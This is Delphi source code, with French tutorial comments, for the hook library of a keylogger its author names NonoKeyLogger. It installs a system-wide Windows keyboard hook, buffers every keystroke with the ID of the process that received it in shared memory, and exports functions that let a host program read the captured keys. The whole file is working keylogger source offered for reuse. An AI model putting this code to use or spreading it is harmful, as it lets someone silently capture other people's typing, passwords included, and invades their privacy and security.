library DllHook;
//
// Sujet : Librairie de capture des touches pour le programme NonoKeyLogger
//
// Par Nono40 : http://nono40.developpez.com   http://nono40.fr.st
//              mailTo:nono40@fr.st
//
// Le 18/08/2002
//

uses
  SysUtils,Windows,Classes;

{$R *.res}

// D�finition d'un buffer interm�diaire de stockage des touches
// 127 touches maxi en attente de lecture pas GetNextKey()
Type
  PKeyBuffer = ^TKeyBuffer;
  TKeyBuffer = Record
    kbIN  :Integer;
    kbOUT :Integer;
    kbKEY :Array[0..127] of Integer;
    kbID  :Array[0..127] of Integer;
  End;

// Handle des acc�s aux Hook et FileMapping par l'application principale
// Ces donn�es bien que globales ne sont pas accessible par les autres
// process. Elles ne peuvent donc pas �tre utilis�es par la fonction
// CallBack du hook.
Var
  HandleHook  :Integer    =0;
  HandleFile  :Integer    =0;
  Pointeur    :PKeyBuffer =Nil;

// Fonction CallBack du hook plac� sur le clavier. Les touches lues sont plac�es
// dans le buffer pour �tre ensuite lues par la fonction GetNextKey().
Function KeyboardHook(code: Integer; wparam: WPARAM; lparam: LPARAM): LRESULT stdcall;
Var HandleFileLocal:Integer;
    PointeurLocal  :PKeyBuffer;
    Adresse        :Integer;
Begin
  // Il faut penser que cette fonction s'ex�cute dans chaque process actif.
  // Les donn�es globales de la dll ne sont donc pas accessibles. Le file
  // mapping permet de palier � ce probl�me en offre un espace m�moire
  // facile d'acc�s en n'en connaissant que le nom.
  HandleFileLocal:=OpenFileMapping(FILE_MAP_WRITE,False,'KEYHOOK');
  If HandleFileLocal<>0
  Then Begin
    PointeurLocal:=PKeyBuffer(MapViewOfFile(HandleFileLocal,FILE_MAP_WRITE,0,0,0));
    If PointeurLocal<>Nil
    Then Begin
      // Une fois le FileMapping effectu�, le buffer est en acc�s direct, on ajoute
      // alors la nouvelle touche � la suite de la file
      // WParam contient le code de touche virtuel
      // Le bit 31 de LParam est � 0 pour un KeyDown et � 1 pour un KeyUp
      Adresse:=(PointeurLocal^.kbIN+1)And 127;
      PointeurLocal^.kbID [Adresse]:=GetCurrentProcessId;
      PointeurLocal^.kbKEY[Adresse]:=(WParam And $0000FFFF)+(LParam And Longint($80000000));
      PointeurLocal^.kbIN          :=Adresse;
      UnMapViewOfFile(PointeurLocal);
    End;
    CloseHandle(HandleFileLocal);
  End;
  Result:=CallNextHookEx(HandleHook,code,wparam,lparam);
End;

// Proc�dure d'initialisation du Hook et de cr�ation du FileMapping
// Elle doit �tre appel�e une fois et une seule en d�but de votre application
Function StartHook:Boolean;StdCall;
begin
  HandleFile:=CreateFileMapping
    ($FFFFFFFF                   // Handle m�moire => partage de m�moire et non de fichier
    ,NIL                         // S�curit� par d�faut
    ,PAGE_READWRITE              // Acc�s en lecture/�criture
    ,0                           // Taille de la zone partag�e   HIGH
    ,SizeOf(TKeyBuffer)          // Taille de la zone partag�e   LOW
    ,'KEYHOOK'  );               // Nom du partage

  If HandleFile<>0
    Then Pointeur:=PKeyBuffer(MapViewOfFile
      (HandleFile                // Handle obtenu par CreateFileMapping
      ,FILE_MAP_WRITE            // Acc�s en lecture/�criture
      ,0                         // Pas d'offset
      ,0                         // Pas d'offset
      ,0));                      // Mapping de tout le fichier

  If Pointeur<>Nil
  Then Begin
    Pointeur^.kbIN  :=0;         // Initialisation de la file d'attente
    Pointeur^.kbOUT :=0;
  End;
  HandleHook:=SetWindowsHookEx
    (WH_KEYBOARD                 // Type de HOOK utilis� ( sur le clavier ici )
    ,KeyboardHook                // Adresse de la fonction CallBack qui sera appel�e
    ,hInstance                   // Handle de la dll demandant le Hook
    ,0);                         // Pas d'ID Thread, car on veut un Hook syst�me
  Result:=(HandleHook<>0) And (HandleFile<>0) And (Pointeur<>Nil);
End;

// Proc�dure de fermeture du Hook
// Doit �tre appel�e en fin d'application
Function StopHook:Boolean;StdCall;
Begin
  Result:=True;
  If Pointeur<>Nil Then UnMapViewOfFile(Pointeur);               // Lib�ration du mapping
  If HandleFile<>0 Then CloseHandle(HandleFile);                 // Fermeture du fichier
  If HandleHook<>0 Then Result:=UnHookWindowsHookEx(HandleHook); // Suppression du Hook
End;

// Proc�dure de lecture du buffer des touches par l'application.
// Chaque appel de la fonction envoi la touche suivante. La fonction
// renvoi True si une touche est effectivement disponible dans le buffer.
// Dans ce cas Key contient le code virtuel de la touche
// avec en plus dans le bit 31 de key, l'�tat KeyUP/KeyDown.
// Si le buffer est vide, la fonction renvoie False.
Function GetNextKey(Var Key,ID:Integer):Boolean;StdCall;
Var Adresse:Integer;
Begin
  If Pointeur^.kbIN<>Pointeur^.kbOUT
  Then Begin
    Adresse:=(Pointeur^.kbOUT+1)And 127;
    ID  := Pointeur^.kbID [Adresse];
    Key := Pointeur^.kbKEY[Adresse];
    Pointeur^.kbOUT := Adresse;
    Result:=True;
  End
  Else Result:=False;
End;

Exports StartHook,StopHook,GetNextKey;

end.
